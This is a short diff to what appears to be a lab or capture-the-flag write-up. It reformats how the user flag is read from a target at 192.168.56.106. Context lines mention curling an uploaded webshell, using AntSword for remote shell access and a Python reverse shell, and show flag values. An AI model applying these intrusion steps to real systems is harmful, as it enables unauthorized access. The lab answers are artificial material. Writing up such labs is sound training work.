@@ -141,9 +141,10 @@ curl http://192.168.56.106/webshell.php
 We connect to the uploaded webshell using **AntSword**, which provides a full file manager and remote shell interface.
 
 Through AntSword, we read the user flag:
-```text
-/home/connection/local.txt → 3f491443a2a6aa82bc86a3cda8c39617
+```bash
+cat /home/connection/local.txt
 ```
+Output: `3f491443a2a6aa82bc86a3cda8c39617`
 
 We then execute a Python reverse shell to gain a stable shell:
 
@@ -193,3 +194,4 @@ We retrieve the root flag:
 cat /root/proof.txt
 ```
 Output: `a7c6ea4931ab86fb54c5400204474a39`
+
